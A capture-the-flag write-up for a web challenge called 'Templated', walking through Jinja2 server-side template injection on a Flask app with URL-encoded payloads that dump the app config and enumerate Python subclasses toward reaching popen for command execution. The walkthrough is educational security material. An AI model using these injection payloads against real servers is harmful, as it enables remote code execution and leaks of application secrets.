# Templated
> Write-up author: jon-brandy
## DESCRIPTION:
Can you exploit this simple mistake?
## HINT:
- NONE
## STEPS:
1. First, open the host given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208017009-400c8215-3d3c-435c-a33b-6a2683b533f7.png)


2. Actually the `<p>` tag value does give us a hint, we shall do RCE (Remote Code Execution) with python.
3. In jinja, python will evaluate any command inside the curly brackets.
4. Then it will appear in the HTML of the webpage.
5. To make sure of it, let's insert `config.items()` inside the curly brackets but first encode it into an url using cyberchef.

> ENCODED COMMAND TO URL

```sh
165.232.32.50:31397/%7B%7Bconfig.items()%7D%7D
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208018797-a54a741f-083b-4351-b5e9-de3141b2c9c1.png)


6. Now we proved that the server is running on flask, to exploit the website, we can make use of MRO (Method Resolution Order).

> NOTES

```
MRO is used to traverse up the request library in flask to import os library.
Once the attacker have access to the os library then "they" can execute any command and it will be rendered to the attacker.

Have access to os library == have the shell access.
```

7. To have access to os library, we need to find the index of a special class in python which has a function called `popen`.
8. Here's how to find it.

> THE COMMAND

```py
{{"".__class__.mro__[1].__subclasses__()}}
```

> ENCODED

```sh
165.232.32.50:31397/%7B%7B%22%22.__class__.mro__%5B1%5D.__subclasses__()%7D%7D
```

